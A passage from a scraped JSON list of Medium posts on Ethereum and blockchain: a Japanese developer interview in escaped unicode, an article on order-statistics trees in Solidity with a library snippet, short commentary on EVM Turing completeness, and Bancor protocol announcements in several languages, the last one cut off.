u30e2\u30cb\u30bf\u30fc\u898b\u305b\u305f\u308a\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u307f\u305f\u308a\u3057\u3066\u3001\u305d\u3093\u306a\u306b\u96e3\u3057\u304f\u306a\u3044\u3068\u3044\u3046\u3053\u3068\u304c\u5206\u304b\u308b\u3068\u3044\u3044\u3067\u3059\u306d\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306b\u98db\u3073\u8fbc\u3093\u3060\u306e\u306f\u306a\u305c\u3067\u3057\u3087\u3046\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u81ea\u52d5\u904b\u8ee2\u306a\u3069\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3067\u8fd1\u672a\u6765\u306e\u5909\u308f\u308b\u30a4\u30e1\u30fc\u30b8\u304c\u6e67\u3044\u305f\u304b\u3089\u3067\u3059\u3002\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3084\u6697\u53f7\u306e\u30c6\u30af\u30ce\u30ed\u30b8\u30fc\u304c\u8272\u3005\u306a\u3068\u3053\u308d\u3067\u4f7f\u308f\u308c\u308b\u3088\u3046\u306b\u306a\u308b\u306f\u305a\u306a\u306e\u3067\u3001\u3069\u306e\u696d\u754c\u3067\u3082\u7d76\u5bfe\u306b\u305d\u306e\u4e2d\u8eab\u3092\u7406\u89e3\u3057\u306a\u3044\u3068\u7f6e\u3044\u3066\u3044\u304b\u308c\u308b\u3068\u611f\u3058\u3066\u3044\u307e\u3059\u3002\u2015\u672a\u77e5\u306e\u9818\u57df\u306b\u98db\u3073\u8fbc\u3080\u306e\u306f\u6016\u304f\u306a\u304b\u3063\u305f\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u5168\u7136\u6016\u304f\u306a\u304b\u3063\u305f\u3067\u3059\u306d\u3002\u79c1\u306f\u65b0\u3057\u3044\u3053\u3068\u3092\u5b66\u3076\u3053\u3068\u3092\u3059\u3054\u304f\u697d\u3057\u3044\u3067\u3059\u3057\u3001\u30d7\u30e9\u30b9\u3057\u304b\u306a\u3044\u3067\u3059\u3002\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u3068\u3057\u3066\u3001\u5b89\u5168\u306a\u74b0\u5883\u3067\u30d1\u30bd\u30b3\u30f3\u3092\u3044\u3058\u308b\u3060\u3051\u306a\u306e\u3067\u3001\u6016\u3044\u3053\u3068\u306f\u5168\u7136\u306a\u3044\u3067\u3059\u306d\uff08\u7b11\uff09\u3002\u30c0\u30e1\u306a\u30a8\u30f3\u30b8\u30cb\u30a2\u306f1\u5ea6\u7406\u89e3\u3057\u305f\u3053\u3068\u3092\u305f\u3060\u7e70\u308a\u8fd4\u3059\u3060\u3051\u3002\u4e00\u7dd2\u306b\u9032\u5316\u3057\u3066\u3044\u304b\u306a\u3044\u3068\u3001\u554f\u984c\u304c\u8d77\u3053\u3063\u305f\u6642\u306b\u5bfe\u5fdc\u3067\u304d\u306a\u304f\u306a\u308a\u307e\u3059\u3002\u958b\u767a\u8005\u3068\u3057\u3066\u65b0\u3057\u3044\u3053\u3068\u3092\u5b66\u3093\u3067\u3044\u304f\u3053\u3068\u304c1\u756a\u5927\u4e8b\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u4f34\u30eb\u30ab\u6c0f\u304c\u8a9e\u3063\u3066\u304f\u308c\u305f\u3088\u3046\u306b\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3001\u4eee\u60f3\u901a\u8ca8\u9818\u57df\u306e\u7d4c\u9a13\u304c\u306a\u304f\u3066\u3082\u307e\u305a\u306f\u98db\u3073\u8fbc\u3093\u3067\u307f\u3066\u89e6\u308c\u3066\u307f\u3066\u3082\u3089\u3048\u305f\u3089\u3068\u601d\u3044\u307e\u3059\uff012\u670824\u65e5\u306e\u4eee\u60f3\u901a\u8ca8\u30fb\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u4f01\u696d\u9650\u5b9a\u306e\u5408\u540c\u4f01\u696d\u8aac\u660e\u4f1a\u306b\u306f\u7d0420\u793e\u304c\u51fa\u5c55\u4e88\u5b9a\u3067\u3059\u3002\u696d\u754c\u7d4c\u9a13\u3084\u8ee2\u8077\u3092\u8003\u3048\u3066\u3044\u308b\u304b\u3069\u3046\u304b\u306f\u554f\u308f\u308c\u305a\u3001\u7121\u6599\u3067\u51fa\u5165\u308a\u81ea\u7531\u306a\u306e\u3067\u3001\u6c17\u8efd\u306a\u6c17\u6301\u3061\u3067\u300c\u4e2d\u306e\u4eba\u300d\u306b\u4f1a\u3044\u306b\u884c\u3063\u3066\u307f\u3066\u4e0b\u3055\u3044\u306d\uff01https://withb.co.jp/lp/jobfair01/", "responses": ""}, {"title": "Binary Search Trees and Order Statistics in Solidity for\u00a0Ethereum", "author_name": "Rob Hitchens", "link": "https://hackernoon.com/binary-search-trees-and-order-statistics-for-ethereum-db47e2dd2c36?source=search_post", "post_date": "Mar 6", "readtime": "10 min read", "upvotes": "22", "content": "Binary Search Trees and Order Statistics in Solidity for\u00a0EthereumFinite Trees for Infinite\u00a0SetsRob HitchensBlockedUnblockFollowFollowingMar 6Photo by Luke Chesser on\u00a0UnsplashThis should not be a first\u00a0choiceThis post is about what we can do when we\u2019ve exhausted all of the alternatives.I\u2019ve written before that sort order can almost always be handled outside Ethereum Smart Contracts: The Joy of minimalism in Smart Contract Design.And, I\u2019ve written before about patterns for efficiently organizing data in unordered lists. Solidity CRUD.Thanks to mappings, there is usually no need to \u201csearch\u201d to find records of interest in a Solidity contract. It follows that a principle reason for sorting records, namely finding them again, is generally not a sound justification for the increased cost and complexity of sorting records.In many cases, sorted and filtered data is interesting to software-clients. But, since software-clients are well-capable of sorting the information themselves, that too is a poor justification for burdening a smart contract with the heavy lifting of sorting a list.Many statistics such as lowest, highest, average and moving average can be computed on-the-fly without resorting to sorting the data. Those, too, are poor justifications for sorting a list in an Ethereum smart contract.If contracts only need to find previous and next records and enumerate them in sorted order, a linked list is a simple pattern. When combined with hints about where to start, insertion cost can be scale-invariant. That\u2019s what we want because anything that gets more expensive as the set expands is probably a serious defect: Getting Loopy with Solidity.We should always prefer an efficient workaround over the considerably more complex idea of sorting a\u00a0list.There are cases, however, where the sort order is important to a contract and none of the aforementioned tools are right for the job.What if a contract needs to know the median value in a set? Or, the rank of a given value? Or, the value at a certain rank? For example, consider test scores graded on a curve. Suppose everyone in the top 10% of the sorted test results is to get an A+ and the contract logic (a prize, perhaps?) depends on this result. And, suppose this requirement needs to be handled by a contract. An Oracle is a possibility, but what if the implied return to centralization isn\u2019t acceptable?Intuitively, we can see that such a process is both simple and deterministic. A smart contract ought to be able to do it. But, such calculations may depend on a sorted list and the kind of random access that a linked list doesn\u2019t excel at.Cases like this call for a general-purpose and efficient sorting solution.This is a non-trivial undertaking and the alternatives mentioned are better-suited to Ethereum if they can be applied successfully.ChallengesI believe Nick Johnson first starting talking about amortization of work in smart contracts. The idea is to take processes that would cost too much gas if tackled all once and break them down into smaller tasks that can be completed individually on a limited gas budget. Some extra difficulty comes from the need to ensure the contract state is valid at all times even when the overall process in only partially complete.If we\u2019re going to deal with sorted lists, then it would be a good idea to deal with lists that are sorted at all times rather than a monolithic process that sorts a completely disarranged set. A Binary Search Tree is such a structure.I won\u2019t cover the details here. In summary, BSTs maintain an ordered list by maintaining a set of pointers as data is added and removed.BSTs offer certain assurances. For example, in a \u201cperfectly balanced\u201d tree, any record can be found in O(log n) steps. In a set of 1,024 records, one can find any record in, at most, 10 steps because 2**10 is 1,024. Each node is a sorted value with up to two child nodes, usually called left and right. Left points to something smaller, and right points to something larger. This is the \u201ctree\u201d aspect of the structure.\u201cPerfectly balanced\u201d means that any node in the tree has an ~equal (+/- 1) number of children on the left and right side, so the search algorithm can reduce the search area by half with each step. This is the \u201cbinary\u201d aspect of a BST. Achieving and maintaining this balance is accomplished by re-organization during inserts and deletes. (Modification is a delete followed by an insert).When everything is organized like this, it is always possible find an empty node where new data can be inserted while maintaining the searchable aspect of the tree. Re-organization for tree balance is always possible with a little rearranging of node positions. However, remember O(log n). Execution cost increases as the tree gets bigger. And, balancing adds steps to the insertion and removal processes.This arrangement is not optimized for the economics of Ethereum smart contracts. Smart contract costs are heavily weighted toward write operations, so it doesn\u2019t make a lot of sense to perfectly optimize read-back efficiency while disregarding the cost of frequent, intricate reorganization.Rising transaction costs as the tree grows is a serious concern for Ethereum smart contracts because it implies that the cost of using the contract might increase to the point of being impractical or even impossible to use. When the gas cost exceeds the block gas limit it\u2019s not possible to run a transaction even if one is willing to pay for it. That\u2019s usually unacceptable.On the other hand, a \u201csignificantly imbalanced\u201d tree is also unacceptable. It defeats the purpose of using a BST and we would end up with costs comparable to iteration through a linked list.We need some sort of compromise.Red Black\u00a0TreeA Red Black Tree is a variant of a BST that reduces update costs by tolerating limited imbalance in the tree. Such a tree can be a little lopsided, but not too much. It\u2019s still possible to reason about the maximum cost in the worst-case scenario. Tolerating limited imbalance significantly reduces the frequency and extent of necessary reorganizations.Cost still increases with size, but at a reduced rate of increase. We get most of the benefits of a balanced tree at significantly reduced update cost.This is progress, but\u00a0\u2026What we really need is fixed maximum cost, so we can be sure that it will always be possible to use the contract, at a reasonable cost.Finite Trees for Infinite\u00a0SetsReturning to the purpose of sorting in the first place, there are problems that can be solved with imperfect sorting. Finding the records in the top 10% is such a case. Tolerating less-then-perfect sorting will be key to ensuring it\u2019s possible to calculate a fixed cost for the worst-case scenario on a set of unlimited size.Let us consider the question of pinpointing the value (say\u00a0\u2026 test score) at a precise percentile rank. Let\u2019s say we want the 90th percentile of 100,000 test scores in the range of 0/50 to 50/50.A na\u00efve way to approach this would be to consider just sorting the results, implying a BST with 100,000 nodes. We can see right away this is probably too expensive and subject to failure due to the gas cost of insertion and deletion into any sort of tree structure. Do we really need to do that?Perhaps surprisingly, we could accomplish our goal with a tree of 51 nodes.Each node will be the set of test scores with a certain grade. The range of possible scores is 0\u201350, so at most there will be 51 unique grades. There will be thousands of records that share the same grade, but that\u2019s not important. By definition, they also share the same rank.The point is that we don\u2019t need to sort the 100,000 test scores, only the 51 unique possible values. We can treat each unique value as a set that contains many results from many instances (student test results). We will need to know how many such instances exist at each node so we can figure out how many instances exist above and below, so we can figure out the rank.For emphasis, we don\u2019t need to sort the tests with the same result, at all.Each node contains the unordered set of instances that share the same sorted value and the count of the instances that exist in the subtree starting at that node. Illustration adapted from image at https://en.wikipedia.org/wiki/Red%E2%80%93black_treeWhat if we want more precision?Suppose we have values in the range of 1\u20135,000,000 (and lots of them) and we want to be able to pinpoint the rank, percentile, median, etc., to three significant digits of accuracy. The node count has nothing to do with the number of instances to sort or even the range of the sorted values. It\u2019s the number of unique values to sort that matters.We could scale and round the values to guarantee that there can never possibly be more than 1,000 nodes in the tree and to ensure that we don\u2019t pay for sorting beyond the precision we actually need.We don\u2019t need to sort similar values with the same result, at all.Each node in the tree contains the set of instances with approximately equal values. These are treated as an unordered set.Limiting Tree Size is key to establishing a maximum update cost. It means there will always be a calculable cost for the worst-case scenario.\u201dWe know that we can maintain an unordered set in each node using the Solidity CRUD pattern, so\u00a0\u2026If we have maximum tree maintenance cost coupled with maximum set maintenance cost, then we have sorted (enough) lists with maximum gas costs at any scale.Photo by Zolt\u00e1n Cse on\u00a0UnsplashBingo. We can work with that. A BST with a known insertion and deletion cost at any scale is appropriate for Ethereum.You can put as many instances as you want into such a structure and it will never exceed the predetermined maximum gas\u00a0cost.FIFO method of limiting tree\u00a0size.For something like a reputation system, it might suffice to limit the tree to n recent records by ejecting the oldest first when a limit is exceeded.The method of limiting the overall tree size is flexible. Just don\u2019t skip it. Before you use this structure, you should be able to show how your overall design imposes an upper bound on the tree size.Order Statistics TreeAn Order Statistics Tree is a BST with nodes that contain a count. The count tallies the number of instances in the subtrees that start at each node. This makes it possible to efficiently (cheaply) work out the number of instances above and below any position. When you have above and below counts, you have rank. When you have the rank of a given value and the records at each level, you can enumerate all the records in the top 10% which is what we wanted to do.A contract can see things like the fact that there are 37 records in the 65\u201370th percentile and it can enumerate them.In the linked implementation, unordered lists with insert and delete logic (See Solidity CRUD) contain the identifiers of all the instances that share the sorted value of a given node. It\u2019s a self-balancing tree that uses the Red Black Tree re-balancing algorithm. That\u2019s everything we need for a potpourri of handy tree exploration and statistical functions.The tree size limiting process is intentionally left out for maximum flexibility. Two ideas, precision and FIFO are described above. More are contemplated. You have flexibility here. Use any strategy you like as long as the gas cost is acceptable at your maximum possible tree size.Other Statistics TreeThe example implementation gets a lot of mileage out of maintaining a count at the node level. A similar approach can be applied to all sorts of statistics about the sets.For example, consider an order book where the product of bid and volume is interesting. If each node contains a sum of bid x volume in the subtree at the node, then it would be just as fast (and cheap) to work out market depth above and below any price. Could that be interesting to a contract? The process and the algorithm that maintains the structure can probably be applied to a number of statistics that haven\u2019t even been considered.A word of caution: This is a non-trivial library that has not been audited. You should consider it experimental and remember that it is presented without warranty of any kind. You are advised that you should not use it or any variation of it in a production contract without first publicly disclosing your quality-assurance process, code audits, test plan and bug bounty. You use it at your own exclusive risk.Feedback and contributions are welcomed with gratitude.The code: https://github.com/rob-Hitchens/OrderStatisticsTreeHere\u2019s a peek at the functions in the\u00a0library:using HitchensOrderStatisticsTreeLibrary for ... Library.TreeHitchensOrderStatisticsTreeLibrary.Tree tree;function snippet() public {        uint value;       // inspecting by value        uint row;         // inspecting instances of value, by row        uint _rank;       // inspecting by rank        uint _percentile; // inspecting by percentile        uint root = tree.root;        uint frst = tree.first();        uint last = tree.last();        uint next = tree.next(value);        uint prev = tree.prev(value);        bytes32 key = tree.valueKeyAtIndex(value,row);        bool vexs = tree.exists(value);        bool kexs = tree.keyExists(key, value);        uint cont = tree.count();        uint pctl = tree.percentile(value);        uint prml = tree.permil(value);        uint atpc = tree.atPercentile(_percentile);        uint atpm = tree.atPermil(value);        uint medn = tree.median();        uint rank = tree.rank(value);        uint belw = tree.below(value);        uint abov = tree.above(value);        uint atrk = tree.atRank(_rank);        // Insert and Remove key/value pairs        tree.insert(key, value);        tree.remove(key, value);    }Shout out to Bokky Poobah who was first to release a Solidity Red Black Tree implementation upon which the Order Statistics Tree is constructed.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and instructor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda and Quorum bootcamps by B9lab.", "responses": ""}, {"title": "Ethereum VM and DSLs for Smart Contracts (2015)", "author_name": "Zvi Avraham", "link": "https://blog.reverse.vc/ethereum-vm-and-dsls-for-smart-contracts-2015-52ec52eafbed?source=search_post", "post_date": "Sep 2, 2017", "readtime": "", "upvotes": "2", "content": "Ethereum VM and DSLs for Smart Contracts (2015)Zvi AvrahamBlockedUnblockFollowFollowingSep 2, 2017My 2.5-years old presentation about Bitcoin, Smart Contracts and Ethereum", "responses": ""}, {"title": "", "author_name": "vasa", "link": "https://medium.com/@vaibhavsaini_67863/before-answering-your-question-let-me-make-one-thing-clear-explained-below-1b9d24c4157e?source=search_post", "post_date": "Dec 13, 2018", "readtime": "", "upvotes": "12", "content": "vasaBlockedUnblockFollowFollowingDec 13, 2018Hi Benoit Rognier!Before answering your question, let me make one thing clear(explained below).Actually, most(maybe all) of the platforms who display themselves as \u201cTuring Complete\u201d are not actually turing complete.Take the example of Ethereum. The programming language used, Solidity, is a turing complete language; but when you see the whole architecture(EVM), it\u2019s not turing complete. This is because Ethereum uses gas in order to limit the operations and memory usage while executing any transaction on the network.Each block has a gas limit(gas limit was around 8000000 around May 2018). So, as a block is made up of transactions, each transaction has some gas limit. So, a transaction can only do a limited amount of computations/memory consumption. Thus the system as a whole is not \u201cTuring complete\u201d, even if the underlying language is Turing complete.Coming back to your question, \u201cTuring completeness\u201d of the language provides you the flexibility of implementing any business logic; but on the other hand it also limits(using EVM architecture) that feature to counter the problems which come along with it(difficulty in formally verifying the program).", "responses": ""}, {"title": "The Ether Review #41\u200a\u2014\u200aMartin Lundfall, Rage Against the\u00a0Machine", "author_name": "ConsenSys", "link": "https://media.consensys.net/the-ether-review-41-martin-lundfall-rage-against-the-machine-74e5e7a791e1?source=search_post", "post_date": "Sep 9, 2016", "readtime": "", "upvotes": "", "content": "The Ether Review #41\u200a\u2014\u200aMartin Lundfall, Rage Against the\u00a0MachineConsenSysBlockedUnblockFollowFollowingSep 9, 2016What is the Ethereum Virtual Machine, what design trends and decisions influence its operation and what does that mean for Ethereum the platform?Today we dive deep. There is a debate around whether the flexibility of the imperative paradigm of programming language design or the verifiability of the functional paradigm are more appropriate for the Ethereum Virtual Machine. Martin is in the functional camp which he believes can make Ethereum a more robust and powerful platform. The EVM itself is often overlooked as a black box, but is one of a tripartite of technologies including the consensus mechanism and the distributed ledger, whose design is interdependent. Exploring the relationship between these components is an interesting way to gain a deeper understanding of everyone\u2019s favorite world computer.Content: Martin Lundfall, Arthur FallsSubscribe on iTunes or Soundcloud", "responses": ""}, {"title": "More like\u00a0this", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/more-like-this-cbf164f1aba3?source=search_post", "post_date": "Mar 18", "readtime": "", "upvotes": "", "content": "More like\u00a0thisRob HitchensBlockedUnblockFollowFollowingMar 18Stories by Rob Hitchens around the web.Unpacking the Ethereum Stack for DevelopersThe Solidity Withdrawal PatternIs it too late to get into blockchain?Storage Pointers in SolidityGetting Loopy with SolidityCalls vs. transactions In Ethereum smart contractsB9lab on the Zero Knowledge PodcastThe Joy of Minimalism in Smart Contract DesignBinary Search Trees and Order Statistics in Solidity for EthereumEthereum StackExchangePhoto by Maxim Du\u017eij on\u00a0UnsplashRob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": ""}, {"title": "Le Protocole Bancor", "author_name": "Bancor", "link": "https://medium.com/the-bancor-protocol-french/le-protocole-bancor-6747e94678a1?source=search_post", "post_date": "Jul 13, 2017", "readtime": "3 min read", "upvotes": "", "content": "Le Protocole BancorBancorBlockedUnblockFollowFollowingJul 13, 2017Bonjour tout le monde, nous sommes l\u2019\u00e9quipe \u00e0 l\u2019origine du Protocole de Bancor (PDF) et nous construisons un syst\u00e8me mon\u00e9taire hi\u00e9rarchique et d\u00e9centralis\u00e9, sur la blockchain.Lorsque l\u2019on analyse le monde des \u00e9changes entre personnes, on peut distinguer deux grands ensembles de choses que nous partageons et \u00e9changeons\u200a\u2014\u200ades informations et de la valeur.\u00a0Alors que l\u2019information (compos\u00e9e de contenus tels des textes, images, vid\u00e9os, etc.) est par nature reproductible (lorsque vous la partagez, l\u2019autre personne et vous-m\u00eame en \u00eates chacun d\u00e9tenteurs), la valeur \u00e0 l\u2019inverse ne l\u2019est pas (lorsque vous la transmettez \u00e0 quelqu\u2019un, alors vous ne la d\u00e9tenez plus.)Avant l\u2019\u00e8re d\u2019Internet, les r\u00e9seaux d\u2019information priv\u00e9s \u00e9taient nombreux, ce dont les plus vieux d\u2019entre-nous peuvent se rappeler, comme BBS, Prodigy, Compuserve, AoL, pour n\u2019en citer que quelques exemples. La mont\u00e9e d\u2019un Internet public a tout chang\u00e9 et ceux qui ont surv\u00e9cu ont alors adopt\u00e9 la nouvelle norme mondiale ouverte pour l\u2019\u00e9change d\u2019informations, qui repose sur une collection de r\u00e9seaux TCP/IP, qui sont reli\u00e9s par des accords d\u2019\u00e9change de trafic (peering agreements).Jusqu\u2019\u00e0 la Blockchain, toutes les devises repr\u00e9sentant de la valeur vivaient dans des silos cloisonn\u00e9s. La Blockchain, la technologie d\u00e9velopp\u00e9e par le Bitcoin, est un r\u00e9seau d\u2019\u00e9change de valeur d\u00e9centralis\u00e9, l\u2019Internet de l\u2019argent. Il finira un jour ou l\u2019autre par remplacer une grande partie des r\u00e9seaux de banques priv\u00e9es actuels, et permettra aux nouveaux acteurs (et aux anciens qui se seront adapt\u00e9s) de cr\u00e9er de nouveaux types de valeur, en traitant dans un syst\u00e8me ouvert et global n\u2019\u00e9tant plus la propri\u00e9t\u00e9 de quiconque.L\u2019\u00e9quipe Bancor d\u00e9veloppe des produits bas\u00e9s sur Internet depuis la fin des ann\u00e9es 90. Contact Networks, MetaCafe, Mytopia, Particle Code et AppCoin sont quelques-unes des soci\u00e9t\u00e9s dont nous sommes \u00e0 l\u2019origine. Nous sommes tomb\u00e9s sur le Bitcoin en 2011, et avons commenc\u00e9 \u00e0 en explorer les possibilit\u00e9s concernant les devises g\u00e9n\u00e9r\u00e9es par les utilisateurs. Suite au lancement d\u2019Ethereum en 2015, nous avons compris que les smart contracts allaient changer la donne, et permettraient la cr\u00e9ation et la personnalisation de monnaie \u00e0 plus grande \u00e9chelle. Les modules programmables g\u00e9rant la valeur et la conservant (repr\u00e9sent\u00e9s sous forme de jetons) peuvent effectuer des processus li\u00e9s \u00e0 la valeur, et ceci \u00e0 moindre co\u00fbt\u200a\u2014\u200aces processus sont actuellement g\u00e9r\u00e9s par diverses organisations (services de d\u00e9p\u00f4t fiduciaires, bourses d\u2019\u00e9change, cabinets d\u2019avocats, pour n\u2019en nommer que quelques-uns). Cependant, les implications d\u2019un code d\u00e9centralis\u00e9 et autonome pouvant g\u00e9rer l\u2019argent digital via un standard libre d\u00e9di\u00e9 \u00e0 l\u2019\u00e9change de valeur sont beaucoup plus profondes.Au cours de l\u2019\u00e9t\u00e9 2016, nous avons commenc\u00e9 \u00e0 travailler sur Bancor dans le but de cr\u00e9er un syst\u00e8me mon\u00e9taire hi\u00e9rarchique (o\u00f9 un token digital d\u00e9tient d\u2019autres tokens dans sa r\u00e9serve), afin de construire un nouveau standard pour les crypto-monnaies, qui jetterait les bases d\u2019un syst\u00e8me d\u2019\u00e9change global d\u00e9centralis\u00e9. Un syst\u00e8me autonome sans \u00e9carts de prix achat/vente, ni aucun risque de contrepartie, et fournissant une liquidit\u00e9 continue pour tout actif. Un syst\u00e8me permettant la longue tra\u00eene des devises, \u00e0 l\u2019image de ce qu\u2019Internet a permis pour le contenu.Nous aimerions partager avec vous, l\u2019Internet, notre Whitepaper du projet que nous soumettons \u00e0 votre appr\u00e9ciation et \u00e0 vos commentaires. Tout retour et commentaire de votre part est le bienvenu et tr\u00e8s appr\u00e9ci\u00e9.L\u2019\u00e9quipe Bancorhttp://bancor.network", "responses": ""}, {"title": "Protocollo Bancor", "author_name": "Bancor", "link": "https://medium.com/il-protocollo-bancor/protocollo-bancor-9fac4b0a6bd2?source=search_post", "post_date": "Jul 13, 2017", "readtime": "3 min read", "upvotes": "", "content": "Protocollo BancorBancorBlockedUnblockFollowFollowingJul 13, 2017Ciao a tutti, siamo il team dietro il Protocollo Bancor (PDF), e stiamo costruendo un sistema monetario gerarchico e decentralizzato sulla blockchain.Quando guardiamo al mondo degli scambi tra persone, possiamo individuare due categorie di cose che condividiamo e scambiamo\u200a\u2014\u200aInformazioni e Valore. Mentre le informazioni (contenuti quali testi, immagini, video, ecc.) sono per loro natura replicabili (quando le condividi, sia tu che qualcun altro le possedete), il valore invece no (se lo dai a qualcuno, non lo possiedi pi\u00f9).Prima dell\u2019era di internet, c\u2019erano molte reti d\u2019informazione private delle quali alcuni di noi abbastanza in l\u00e0 con l\u2019eta potrebbero persino ricordarsi, come BBS, Prodigy, Compuserve, AoL, giusto per citarne alcune. L\u2019ascesa dell\u2019Internet pubblico ha stravolto tutto, e i sopravvissuti hanno adottato un nuovo standard aperto e globale per lo scambio di informazioni, che si appoggia su una collezione di reti TCP/IP interconnesse attraverso accordi di peering.Fino all\u2019avvento della blockchain tutte le valute, che rappresentano valore, albergavano in silos chiusi. Blockchain, la tecnologia inaugurata da Bitcoin, \u00e8 una rete di scambio di valore decentralizzata, l\u2019Internet della Moneta. Prima o poi rimpiazzer\u00e0 una larga parte delle reti bancarie private di oggi e permetter\u00e0 a nuovi attori (e a quelli vecchi che si saranno adattati) di creare nuovi tipi di valore, nonch\u00e9 effettuare transazioni in un sistema aperto e globale di propriet\u00e0 di nessuno.Il team Bancor ha costruito prodotti per Internet sin dai tardi anni novanta. Alcune delle nostre compagnie erano Contact Networks, MetaCafe, Mytopia, Particle Code e AppCoin. Ci siamo imbattuti in Bitcoin nel 2011 e abbiamo cominciato ad esplorare le possibilit\u00e0 di una valuta generata dagli utenti. In seguito al rilascio di Ethereum nel 2015, abbiamo compreso che i contratti intelligenti avrebbero cambiato le carte in tavola e permesso la creazione e personalizzazione in scala delle valute. Moduli programmabili che gestiscono e conservano valore (rappresentato dai token) possono effettuare processi relativi al valore ad un costo trascurabile\u200a\u2014\u200aprocessi attualmente gestiti da diverse organizzazioni (es. servizi di garanzia sui depositi, siti di scambio, studi legali, giusto per citarne alcuni). Tuttavia, le implicazioni di un codice autonomo e decentralizzato che pu\u00f2 gestire denaro digitale su uno standard aperto per lo scambio di valore, sono decisamente pi\u00f9 profonde.Durante l\u2019estate del 2016 abbiamo cominciato a lavorare a Bancor, con l\u2019obiettivo di creare un sistema monetario gerarchico (in cui un token digitale detiene altri token nelle proprie riserve), per costruire un nuovo tipo di standard per criptovalute che avrebbe posto le fondamenta di un exchange (sito di scambio) globale decentralizzato: che fosse autonomo, senza spread, senza rischi controparte, che provvedesse liquidit\u00e0 continua per ogni asset; che rendesse possibile una lunga sequela di valute cos\u00ec come Internet ha fatto per i contenuti.Vorremmo condividere con voi, Internet, la bozza del nostro whitepaper per commenti e recensioni. Tutti i suggerimenti sono ben accetti e apprezzati.Il Team Bancorhttp://bancor.network", "responses": ""}, {"title": "\u03a4\u03bf \u03a0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf Bancor", "author_name": "Bancor", "link": "https://medium.com/%CF%84%CE%BF-%CF%80%CF%81%CF%89%CF%84%CF%8C%CE%BA%CE%BF%CE%BB%CE%BB%CE%BF-bancor/%CF%84%CE%BF-%CF%80%CF%81%CF%89%CF%84%CF%8C%CE%BA%CE%BF%CE%BB%CE%BB%CE%BF-bancor-385a9cd404e7?source=search_post", "post_date": "Jul 13, 2017", "readtime": "3 min read", "upvotes": "", "content": "\u03a4\u03bf \u03a0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf BancorBancorBlockedUnblockFollowFollowingJul 13, 2017\u03a7\u03b1\u03af\u03c1\u03b5\u03c4\u03b1\u03b9, \u03b5\u03af\u03bc\u03b1\u03c3\u03c4\u03b5 \u03b7 \u03bf\u03bc\u03ac\u03b4\u03b1 \u03c5\u03c0\u03b5\u03cd\u03b8\u03c5\u03bd\u03bf\u03b9 \u03b3\u03b9\u03b1 \u03c4\u03bf \u03c0\u03c1\u03c9\u03c4\u03cc\u03ba\u03bf\u03bb\u03bb\u03bf Bancor (PDF) \u03bc\u03b5 \u03c4\u03bf\u03bd \u03c3\u03c4\u03cc\u03c7\u03bf \u03bd\u03b1 \u03c7\u03c4\u03af\u03c3\u03bf\u03c5\u03bc\u03b5 \u03ad\u03bd\u03b1 \u03b1\u03c0\u03bf\u03ba\u03b5\u03bd\u03c4\u03c1\u03c9\u03bc\u03ad\u03bd\u03bf, \u03b9\u03b5\u03c1\u03b1\u03c1\u03c7\u03b9\u03ba\u03cc \u03bd\u03bf\u03bc\u03b9\u03c3\u03bc\u03b1\u03c4\u03b9\u03ba\u03cc \u03c3\u03cd\u03c3\u03c4\u03b7\u03bc\u03b1 \u03c3\u03c4\u03b7\u03bd \u03b1\u03bb\u03c5\u03c3\u03af\u03b4\u03b1 \u03c4\u03c9\u03bd \u03bc\u03c0\u03bb\u03bf\u03ba \u00ab\u0392lockchain\u00bb.\u03a3\u03b5 \u03ad\u03bd\u03b1\u03bd \u03b4\u03b9\u03b1\u03c3\u03c5\u03bd\u03b4\u03b5\u03cc\u03bc\u03b5\u03bd\u03bf \u03ba\u03cc\u03c3\u03bc\u03bf, \u03c5\u03c0\u03ac\u03c1\u03c7\u03bf\u03c5\u03bd \u03b4\u03c5\u03bf \u03ba\u03cd\u03c1\u03b9\u03b5\u03c2 \u03ba\u03b1\u03c4\u03b7\u03b3\u03bf\u03c1\u03af\u03b5\u03c2 \u03c0\u03bf\u03c5 \u03c3\u03c5\u03bd\u03b1\u03bb\u03bb\u03ac\u03c3\u03c3\u03bf\u03bd\u03c4\u03b1\u03b9\u200a\u2014\u200a\u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2 \u03ba\u03b1\u03b9 \u03b1\u03be\u03af\u03b1. \u0391\u03c0\u03cc \u03c4\u03b7\u03bd \u03bc\u03b9\u03b1 \u03bf\u03b9 \u03c0\u03bb\u03b7\u03c1\u03bf\u03c6\u03bf\u03c1\u03af\u03b5\u03c2 (\u03ba\u03b5\u03af\u03bc\u03b5\u03bd\u03b1, \u03b5\u03b9\u03ba\u03cc\u03bd\u03b5\u03c2, \u03b2\u03af\u03bd\u03c4\u03b5\u03bf \u03ba.\u03bb\u03c0.) \u03bc\u03c0\u03bf\u03c1\u03bf\u03cd\u03bd \u03bd\u03b1 \u03b1\u03bd\u03b1\u03c0\u03b1\u03c1\u03b1\u03c7\u03b8\u03bf\u03cd\u03bd (\u03cc\u03c4\u03b1\u03bd \u03b3\u03b9\u03b1 \u03c0\u03b1\u03c1\u03ac\u03b4\u03b5\u03b9\u03b3\u03bc\u03b1 \u03c3\u03c4\u03ad\u03bb\u03bd\u03b5\u03c4\u03b5 